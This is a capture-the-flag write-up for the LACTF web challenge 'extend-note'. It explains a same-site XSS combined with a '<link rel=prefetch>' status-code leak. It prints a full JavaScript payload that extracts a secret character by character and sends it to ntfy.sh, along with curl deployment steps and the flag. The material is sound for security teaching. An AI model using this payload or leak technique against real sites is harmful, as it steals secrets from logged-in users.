# extend-note

**Category:** web

---

#### Description

Customers loved append-note so much, we decided to add an extended version! :)

#### Solution

extend-note is identical to append-note (part 1) except one line: the error page no longer reflects user input, eliminating the XSS vector used in part 1.

**The app** (Flask 3.0.0, Python 3.14) stores a random 8-hex-char `SECRET` in a `notes` list. Three endpoints:

* `/append?content=X&url=URL` — requires admin cookie. Returns **200** if any note starts with `content`, else **404**. Always appends `content` to `notes`. Responds with a page that JS-redirects to `url` after 100ms.
* `/flag?secret=S` — returns the flag if `S == SECRET`. Has `Access-Control-Allow-Origin: *`.
* After-request headers on all responses: `X-Content-Type-Options: nosniff`, `X-Frame-Options: deny`, `Cache-Control: no-store`.

The admin bot visits any URL with an `httpOnly`, `SameSite=Lax` cookie for the challenge domain and waits 60 seconds.

**The attack has three parts:**

**1. Same-site XSS via blogler**

The blogler challenge (separate LACTF web challenge) runs on `*.instancer.lac.tf` — same site as extend-note. Blogler renders user blog posts through `mistune.html()` with Jinja2's `|safe` filter, giving us stored XSS on a same-site origin. Since both share eTLD+1 `lac.tf`, the admin's `SameSite=Lax` cookie is sent on all subresource requests from blogler to extend-note.

**2. `<link rel="prefetch">` XS-leak oracle**

The challenge's protections (`nosniff`, `X-Frame-Options: deny`, `no-store`) defeat most XS-leak techniques. Comprehensive testing of every HTML element type revealed that **`<link rel="prefetch">` is the one that differentiates HTTP status codes**:

| Element                                        | 200 (text/html + nosniff) | 404 (text/html + nosniff) |
| ---------------------------------------------- | ------------------------- | ------------------------- |
| `<script>`                                     | `onerror`                 | `onerror`                 |
| `<link rel="stylesheet">`                      | `onerror`                 | `onerror`                 |
| `<link rel="preload" as="fetch">`              | `onload`                  | `onload`                  |
| `<link rel="preload" as="script/style/image">` | `onerror`                 | `onerror`                 |
| **`<link rel="prefetch">`**                    | **`onload`**              | **`onerror`**             |
| `<img>`, `<video>`, `<audio>`, `<object>`      | `onerror`                 | `onerror`                 |

This gives a clean boolean oracle: `onload` = prefix matches (200), `onerror` = no match (404).

**3. Extract SECRET and fetch flag**

Probe the secret character by character (16 hex candidates per position, 8 positions) using the prefetch oracle, then fetch the flag from the CORS-enabled `/flag` endpoint.

**Solve payload** (hosted as a blogler blog post):

```html
<script>
(async()=>{
var C='https://extend-note-XXXXX.instancer.lac.tf';
var N='https://ntfy.sh/UNIQUE_TOPIC';
function x(m){fetch(N,{method:'POST',body:m})}
function mk(c){
  return C+'/append?content='+encodeURIComponent(c)
    +'&url='+encodeURIComponent(C+'/')+'&t='+Math.random();
}
function probe(content){
  return new Promise(r=>{
    var l=document.createElement('link');
    l.rel='prefetch';
    var d=0;
    l.onload=()=>{if(!d){d=1;l.remove();r(true)}};
    l.onerror=()=>{if(!d){d=1;l.remove();r(false)}};
    l.href=mk(content);
    document.head.appendChild(l);
  });
}
x('start');
var sec='';
for(var i=0;i<8;i++){
  for(var c of '0123456789abcdef'){
    if(await probe(sec+c)){sec+=c;x('found-'+i+':'+c+' sec='+sec);break}
  }
}
x('SECRET='+sec);
try{
  var r=await fetch(C+'/flag?secret='+sec);
  var t=await r.text();
  x('FLAG='+t);
}catch(e){x('ERR='+e)}
})();
</script>
```

**Deployment steps:**

```bash
# 1. Register on blogler and upload payload as a blog post
curl -s -c cookies.txt -X POST "https://BLOGLER/register" -d "username=solve&password=solve"
curl -s -b cookies.txt -X POST "https://BLOGLER/blog" \
  --data-urlencode "title=x" --data-urlencode "blog@solve.html"

# 2. Send the blogler URL to the admin bot
curl -s -X POST "https://ADMIN_BOT/extend-note" \
  -d "url=https://BLOGLER/blog/solve&g-recaptcha-response="

# 3. Poll ntfy for flag
curl -s "https://ntfy.sh/UNIQUE_TOPIC/json?poll=1"
```

The entire extraction (8 characters × up to 16 probes each = 128 prefetch requests) completes in under 2 seconds. Results are exfiltrated via ntfy.sh.

**Flag:** `lactf{1_R34LlY_n33D_T0_r3m3m83R_t0_R3M0V3_My_d38U9_5T4t3m3nt2}`
